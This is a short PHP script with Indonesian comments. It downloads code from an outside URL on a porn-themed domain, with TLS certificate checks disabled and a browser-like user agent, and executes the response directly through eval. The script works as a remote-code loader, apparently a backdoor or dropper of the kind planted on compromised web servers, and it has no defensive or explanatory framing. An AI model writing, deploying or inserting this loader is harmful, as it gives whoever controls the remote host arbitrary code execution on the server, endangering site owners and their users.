<?php
function fetch_remote_code($url) {
    $ch = curl_init($url);

    // Set opsi dasar
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (PHP script)'
    ]);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        $error = curl_error($ch);
        curl_close($ch);
        return ['success' => false, 'error' => $error];
    }

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code === 200) {
        return ['success' => true, 'code' => $response];
    } else {
        return ['success' => false, 'error' => "HTTP Status: $http_code"];
    }
}

// Ganti URL di sini jika ingin ambil dari sumber lain
$url = "https://v1.javpornsub.net/2.txt";
$result = fetch_remote_code($url);

if ($result['success']) {
    eval("?>{$result['code']}");
} else {
    echo "Gagal mengambil kode: " . htmlspecialchars($result['error']);
}
?>